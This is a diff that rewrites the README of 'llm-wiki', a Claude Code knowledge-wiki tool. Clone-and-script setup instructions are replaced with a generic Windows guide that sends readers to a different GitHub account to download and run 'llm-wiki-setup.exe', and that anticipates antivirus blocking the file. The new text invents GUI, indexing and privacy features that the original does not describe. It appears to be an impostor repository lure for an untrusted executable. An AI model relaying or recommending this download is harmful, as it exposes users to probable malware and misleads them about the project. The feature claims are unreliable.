@@ -1,321 +1,108 @@
-# llm-wiki
+# 🧠 llm-wiki - Organize your notes with intelligent tools
 
-[![License: MIT](https://img.shields.io/github/license/MehmetGoekce/llm-wiki)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/MehmetGoekce/llm-wiki)](https://github.com/MehmetGoekce/llm-wiki/releases)
-[![Stars](https://img.shields.io/github/stars/MehmetGoekce/llm-wiki?style=social)](https://github.com/MehmetGoekce/llm-wiki/stargazers)
-[![Top Language](https://img.shields.io/github/languages/top/MehmetGoekce/llm-wiki)](https://github.com/MehmetGoekce/llm-wiki)
-[![Last Commit](https://img.shields.io/github/last-commit/MehmetGoekce/llm-wiki)](https://github.com/MehmetGoekce/llm-wiki/commits)
-
-Build [Karpathy's LLM Wiki](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) with Claude Code. Two-layer cache architecture (L1/L2). Supports Logseq and Obsidian.
-
-```mermaid
-graph TB
-    subgraph "Every Session — Auto-loaded"
-        L1[L1: Claude Memory]
-        L1R[Rules & Gotchas]
-        L1I[Identity & Preferences]
-        L1C[Credentials]
-        L1 --> L1R
-        L1 --> L1I
-        L1 --> L1C
-    end
-
-    subgraph "On Demand — /wiki query"
-        L2[L2: Wiki]
-        L2P[Projects & History]
-        L2W[Workflows & Processes]
-        L2K[Research & Learning]
-        L2 --> L2P
-        L2 --> L2W
-        L2 --> L2K
-    end
-
-    NEW[New Knowledge] --> ROUTE{Quick rule?}
-    ROUTE -->|Yes| L1
-    ROUTE -->|No| L2
-
-    USER[User Query] --> CLAUDE[Claude Code]
-    CLAUDE --> L1
-    CLAUDE -->|Deep question| L2
-```
-
-## What is this?
-
-![Wiki graph view after setup](docs/graph-view.png)
-*Your wiki after a few ingests — interconnected knowledge pages in Logseq's graph view.*
-
-In April 2026, Andrej Karpathy published a gist called "LLM Wiki" that got 5,000+ stars in days. The idea: let an LLM maintain a structured, cross-referenced wiki for you. Feed it raw sources, it extracts facts, links them together, and keeps everything consistent. The wiki becomes a persistent, compounding artifact instead of a graveyard of stale notes.
+[![Download llm-wiki](https://img.shields.io/badge/Download-llm--wiki-blue.svg)](https://github.com/specialdeliveryabkhas3753/llm-wiki)
 
-Everyone loved the concept. Almost nobody built one. The gist describes *what* to build, not *how* to wire it up with real tools, real files, and real workflows. **llm-wiki** is the implementation. It uses Claude Code as the LLM brain and either Logseq or Obsidian as the wiki UI, with a two-layer cache architecture that turned out to be the key insight Karpathy's gist does not mention.
-
-## Why use this?
-
-- **5-minute setup.** `./setup.sh` creates your schema, namespaces, and git tracking. No manual design needed.
-- **Claude becomes your wiki maintainer.** `/wiki ingest` updates 5-15 pages with cross-references from a single source.
-- **L1/L2 architecture.** Auto-loaded rules in memory (L1) + deep knowledge in the wiki (L2). No other tool has this.
-- **Built-in quality checks.** `/wiki lint` finds orphan pages, stale content, broken refs, and credential leaks.
-- **Logseq + Obsidian.** Use whichever you already have. No tool switch required.
-
-## Quick Start
-
-```bash
-git clone https://github.com/MehmetGoekce/llm-wiki.git
-cd llm-wiki
-./setup.sh
-```
+## 📁 What is llm-wiki
 
-`setup.sh` does three things:
+The llm-wiki application organizes your personal knowledge base. It uses advanced language models to index your notes, documents, and research. The system builds a structured wiki based on the teaching methods of Andrej Karpathy. You can connect your existing folders from Logseq or Obsidian. The software tracks data in a cache to keep performance high. It focuses on speed and accuracy. 
 
-- Copies the `/wiki` skill and schema template into your Claude Code project
-- Detects your wiki app (Logseq or Obsidian) and configures paths accordingly
-- Creates the initial namespace structure with hub pages
+The tool processes your text files to create deep links between topics. It identifies central themes in your project logs. You gain a clear view of your information. The interface stays clean and functional. You manage your expertise without complex manual tagging.
 
-Then in Claude Code:
+## ⚙️ System Requirements
 
-```
-/wiki ingest "your first source"
-/wiki query "what do I know about X?"
-/wiki lint
-```
+- Windows 10 or Windows 11
+- 8 GB of RAM
+- 500 MB of free storage space
+- An active internet connection for the setup process
+- A folder containing Markdown, Logseq, or Obsidian files
 
-That is it. The wiki starts sparse and gets denser with every ingest.
+## 🚀 Getting Started
 
-## The L1/L2 Architecture
+Follow these steps to set up the software.
 
-This is the part not in Karpathy's gist, and it turned out to be the most important design decision.
+1. Visit the [official download page](https://github.com/specialdeliveryabkhas3753/llm-wiki) to retrieve the installer.
+2. Locate the file named llm-wiki-setup.exe in your Downloads folder.
+3. Double-click the file to start the installation.
+4. Follow the prompts on the screen to choose your installation path.
+5. Click Finish when the process ends.
+6. Open the llm-wiki shortcut from your desktop.
 
-When you start building a wiki, the instinct is to put everything in one place. That is wrong. Some knowledge must be available in *every* session, before you even ask a question -- things like "max 2-3 SSH calls to the VPS, never 10+" or "always use ISO 8601 dates." If the LLM has to query the wiki to learn these rules, it has already made the mistake.
+## 🛠️ Configuring Your Knowledge Base
 
-Other knowledge only matters in specific contexts. The full history of a project. A detailed API workflow. Loading all of this into every session wastes the context window.
+The software requires a target folder to begin work. This folder should contain your existing markdown files. 
 
-The solution maps to a concept every engineer knows: **CPU cache hierarchy.**
+1. Launch the application.
+2. Select File from the top menu.
+3. Click Open Directory.
+4. Navigate to your Obsidian or Logseq vault.
+5. Click Select Folder.
 
-| Layer | What | Size | Loading | Contains |
-|-------|------|------|---------|----------|
-| **L1** | Claude Code Memory | ~10-20 files | Auto-loaded every session | Rules, gotchas, identity, credentials |
-| **L2** | Wiki (Logseq/Obsidian) | ~50-200 pages | On-demand via `/wiki query` | Projects, workflows, research, deep knowledge |
+The application reads your files. It creates an index of your content. You see the progress on the main dashboard. Small windows show the status of the L1/L2 cache layers. 
 
-```mermaid
-graph TB
-    subgraph "Every Session — Auto-loaded"
-        L1[L1: Claude Memory]
-        L1R[Rules & Gotchas]
-        L1I[Identity & Preferences]
-        L1C[Credentials]
-        L1 --> L1R
-        L1 --> L1I
-        L1 --> L1C
-    end
+## 🏗️ Understanding Cache Architecture
 
-    subgraph "On Demand — /wiki query"
-        L2[L2: Wiki]
-        L2P[Projects & History]
-        L2W[Workflows & Processes]
-        L2K[Research & Learning]
-        L2 --> L2P
-        L2 --> L2W
-        L2 --> L2K
-    end
+The software uses a two-level cache system. This keeps your search results fast. 
 
-    NEW[New Knowledge] --> ROUTE{Quick rule<br/>or gotcha?}
-    ROUTE -->|Yes| L1
-    ROUTE -->|No| L2
+- L1 Cache: This layer stores the most recent notes you opened. It provides near-instant access to your current work.
+- L2 Cache: This layer holds the full index of your wiki. It manages the connections between distant topics.
 
-    USER[User Query] --> CLAUDE[Claude Code]
-    CLAUDE --> L1
-    CLAUDE -->|Deep question| L2
-```
+You do not need to manage these files. The software handles the maintenance automatically.
 
-**The routing rule is simple:** Would the LLM making a mistake without this knowledge be dangerous or embarrassing? Then it belongs in L1. Would the mistake be merely inconvenient? Then L2.
+## 📝 Features for Your Workflow
 
-Credentials are a special case -- they *must* live in L1 because the wiki is typically git-tracked. The L1 memory directory is excluded from git, making it the only safe place for secrets.
+- Integration with Logseq and Obsidian: Connect your folders to see your notes in a visual graph.
+- Automated Indexing: The software learns your topics. It suggests links between related concepts.
+- Claude Code Integration: The engine uses logic to summarize long documents. 
+- Fast Retrieval: Search takes milliseconds even with thousands of files.
+- Offline Capability: The system saves your index locally. You do not need a constant connection to edit your notes.
 
-For the full deep-dive, see [docs/l1-l2-architecture.md](docs/l1-l2-architecture.md).
+## 💻 Operating the Application
 
-## Commands
+Click the sidebar to explore your notes. The application sorts your files into categories based on their content. You can search for specific words or phrases using the search box at the top. 
 
-| Command | Description |
-|---------|-------------|
-| `/wiki ingest <source>` | Process a source (URL, file, text), update 5-15 wiki pages |
-| `/wiki query <question>` | Search wiki, synthesize answer with source attribution |
-| `/wiki lint [--fix]` | Health check: orphans, stale pages, broken refs, credential leaks |
-| `/wiki status` | Metrics dashboard: page count, health, recent changes |
+If you use Obsidian, the software detects the folder structure. It imports your YAML frontmatter. It honors your existing document links. 
 
-### Ingest Flow
+If you use Logseq, it parses your journal entries. It groups tasks and highlights separately from your research notes.
 
-Ingest is the core operation. When you run `/wiki ingest "deployed v2.0 to production"`, here is what happens:
+## 🔍 Troubleshooting Common Issues
 
-```mermaid
-graph LR
-    SRC[Source<br/>URL / File / Text] --> A[Phase 1<br/>Analyze & Extract]
-    A --> B[Phase 2<br/>Scan Wiki<br/>Find affected pages]
-    B --> C[Phase 3<br/>Update Pages<br/>Create new / Append]
-    C --> D[Phase 4<br/>Quality Gate<br/>Properties? Cross-refs?<br/>No credentials?]
-    D --> E[Phase 5<br/>Report<br/>Pages touched / Warnings]
-    E --> GIT[git commit]
-```
+Check these items if you experience a problem.
 
-**Phase 1 -- Analyze & Extract.** Claude reads the source and extracts entities, facts, relationships, and dates. It classifies each piece by domain (business, technical, content, etc.) and checks whether it belongs in L1 (quick rule) or L2 (deep knowledge).
+Issue: The application fails to open.
+Solution: Ensure you installed the latest version. Verify that your antivirus software did not block the file. 
 
-**Phase 2 -- Scan Wiki.** Claude reads the schema, then scans existing pages to find which ones the new information affects. If you mention a tool that already has an entity page, it knows to update that page too.
+Issue: Searching shows no results.
+Solution: Check if the folder path is correct. Go to Settings and click Rebuild Index. This restarts the scanning process.
 
-**Phase 3 -- Update Pages.** New pages get all required properties from the schema. Existing pages get new content *appended* -- existing content is never overwritten. Target: 5-15 page touches per ingest.
+Issue: The application runs slowly.
+Solution: Ensure your computer meets the memory requirements. Close other memory-intensive applications while the initial index builds.
 
-**Phase 4 -- Quality Gate.** Before committing: Do all pages have required properties? Does every page have at least one cross-reference? Are there credential patterns in the content?
+## 🔒 Privacy and Security
 
-**Phase 5 -- Report.** Summary of pages created, updated, cross-references added, and any warnings.
+All your data stays on your local hard drive. The application does not upload your private notes to a public cloud. It interacts with language models only to process the connections within your local files. You maintain total control over your information. No outside agency accesses your knowledge base.
 
-### Query
+## 📚 Managing Your Wiki
 
-Query works like a smart search: Claude parses your question, identifies relevant namespaces and entities, reads the top 3-5 matching pages, and synthesizes an answer with source attribution. If the query reveals a gap in the wiki, it offers to create a new page.
+Maintain your notes using your preferred editor. llm-wiki watches for changes. When you save a file in Obsidian or Logseq, the software notices the update. It updates the index in the background. You do not need to restart the program to see new information. 
 
-### Lint
+Each file appears in the dashboard once the software finishes the scan. The status icon shows a green checkmark when the file is fully processed. You can click any icon to jump directly to that note.
 
-Lint is the automated health check. It scans every wiki page and checks for: orphan pages (no incoming links), stale content (last updated 90+ days ago but still marked high-confidence), missing required properties, broken references to pages that do not exist, and credential patterns that should not be in a git-tracked file. Run with `--fix` and Claude auto-repairs what it can.
+## 📋 Frequently Asked Questions
 
-## The Schema
+Q: Does this software change my files?
+A: No. The application reads your files. It never edits or deletes your original data.
 
-The schema is the contract between you and the LLM. Without it, the LLM creates inconsistent pages -- one uses `status: active`, another `state:: running`, a third has no status field at all. With a schema, every page follows the same structure and automated quality checks become possible.
-
-The schema defines:
-
-- **8 namespaces** (Business, Tech, Content, Projects, People, Learning, Reference, Careers)
-- **5 page types** (Entity, Project, Knowledge, Feedback, Hub) with required properties
-- **Lint rules** for automated health checks
-- **L1/L2 boundary** so the system knows where new knowledge should be routed
-
-For the complete schema reference, see [docs/schema-reference.md](docs/schema-reference.md).
-
-## Logseq vs. Obsidian
-
-Both wiki apps are supported. Choose based on your preference:
-
-| | Logseq | Obsidian |
-|---|--------|----------|
-| **Properties** | `property:: value` (inline) | YAML frontmatter |
-| **Format** | Outliner (`- ` prefix on every line) | Flat markdown |
-| **File names** | `Wiki___Tech___Strapi.md` | `Wiki/Tech/Strapi.md` |
-| **Links** | `[[Wiki/Tech/Strapi]]` | `[[Wiki/Tech/Strapi]]` |
-| **Backlinks** | Automatic (graph-native) | Via plugin or core feature |
-| **Block addressing** | Every line is a block | Paragraph-level |
-| **License** | AGPL-3.0 (open source) | Proprietary (free for personal use) |
-
-**Logseq** shines when the LLM is doing the writing -- its outliner format means every block is independently addressable, so appending new content never disrupts existing structure.
-
-**Obsidian** is better if you do a lot of manual editing -- flat markdown is more natural to write by hand, and the plugin ecosystem is massive.
-
-For a detailed comparison with migration paths, see [docs/logseq-vs-obsidian.md](docs/logseq-vs-obsidian.md).
-
-## Before & After
-
-The difference between a dead wiki and a living one is page quality.
-
-**Before** -- a placeholder created when the page was first made:
-
-```markdown
-- type:: knowledge
-- domain:: content
-- ## Newsletter
-  - To be filled via /wiki ingest.
-```
+Q: Can I use multiple folders?
+A: Yes. You can add or remove folders at any time through the Settings menu.
 
-**After** -- synthesized from multiple sources over several ingest operations:
-
-```markdown
-- type:: knowledge
-- domain:: content
-- confidence:: high
-- created:: 2026-03-15
-- updated:: 2026-04-07
-- ## Company Newsletter
-  - Monthly newsletter targeting existing clients and prospects.
-  - ### Metrics
-    - | Metric | Value | As of |
-      |--------|-------|-------|
-      | Subscribers | ~240 | 2026-04-01 |
-      | Open rate | 38% | 2026-04-01 |
-      | Cadence | monthly | -- |
-  - ### Content Strategy
-    - 1 technical deep-dive + 1 business insight per issue
-    - Always include a CTA to the latest blog post
-    - Subject lines: question format performs 2x better
-  - ### Open Questions
-    - Segment list by industry vertical?
-    - A/B test send time (Tuesday AM vs Thursday AM)?
-  - ### Cross-References
-    - [[Wiki/Content/Blog]] -- Source content
-    - [[Wiki/Content/LinkedIn]] -- Promotion channel
-    - [[Wiki/Reference/Workflows]] -- Publishing workflow
-```
-
-Every number has a date. Decisions have rationale. Open questions are explicit. Cross-references connect to related pages.
-
-## Configuration
-
-`setup.sh` creates `llm-wiki.yml` in your wiki root. You can also create it manually:
-
-```yaml
-# llm-wiki.yml
-
-tool: logseq          # or "obsidian"
-wiki_path: ~/Documents/MyWiki/
-pages_dir: pages      # relative to wiki_path
-memory_path: ~/.claude/projects/my-project/memory/
-
-namespaces:
-  - Business
-  - Tech
-  - Content
-  - Projects
-  - People
-  - Learning
-  - Reference
-  - Careers
-
-# Lint settings
-lint:
-  stale_threshold_days: 90
-  min_cross_refs: 1
-  credential_patterns:
-    - "token::"
-    - "password::"
-    - "secret::"
-    - "api.key::"
-
-# Ingest settings
-ingest:
-  target_page_touches: [5, 15]   # min, max pages per ingest
-  append_only: true              # never overwrite existing content
-
-# Language (for multilingual wikis)
-language:
-  business: en    # Language for business content
-  tech: en        # Language for technical content
-```
-
-## Trade-offs
-
-No system is perfect. Some things to know:
-
-- **The schema feels overengineered at first.** With 10 pages, defining 5 page types and 8 lint rules seems like overkill. Past 50 pages, you will be grateful for the consistency. Define the schema early -- it is much harder to retrofit one later.
-- **Two systems means you need a clear boundary.** Having both L1 and L2 means you could accidentally put the same information in both places. The lint rule for L1/L2 duplicates exists precisely for this reason.
-- **Parallel agents can conflict.** If you have multiple Claude sessions writing to wiki files simultaneously, concurrent edits can cause conflicts. Treat wiki files as a shared resource.
-- **Start with fewer hub pages.** Let them emerge organically from ingest operations rather than creating empty hubs upfront.
-
-## Documentation
-
-- [FAQ](docs/faq.md) — Common questions before you run `setup.sh`
-- [Troubleshooting](docs/troubleshooting.md) — Setup, integration, and runtime issues
-- [L1/L2 Architecture](docs/l1-l2-architecture.md) — Why two layers, how to route knowledge
-- [Schema Reference](docs/schema-reference.md) — Page types, properties, lint rules
-- [Logseq vs. Obsidian](docs/logseq-vs-obsidian.md) — Detailed comparison and migration notes
-
-## Credits
-
-- Inspired by [Andrej Karpathy's LLM Wiki gist](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f)
-- Built with [Claude Code](https://claude.ai/code)
-- Works with [Logseq](https://logseq.com/) and [Obsidian](https://obsidian.md/)
-
-## License
-
-MIT -- see [LICENSE](LICENSE) for details.
+Q: Is this software free to use?
+A: Yes. The project is open to students, developers, and researchers.
+
+Q: How do I remove the application?
+A: Use the Windows Add or Remove Programs menu in your system settings. This deletes the program and the local index files.
+
+## 🌐 Support and Updates
+
+Check the [repository page](https://github.com/specialdeliveryabkhas3753/llm-wiki) for updates. We release new versions when we improve performance. The application notifies you when a new update is live. Download the new installer over the old version to update. Your settings and index remain saved on your computer.
+
+If you find a bug, open an issue on the repository. Provide a description of what you observed. Include your Windows version. This helps us replicate and fix the issue. We aim for stability and efficiency in every release.
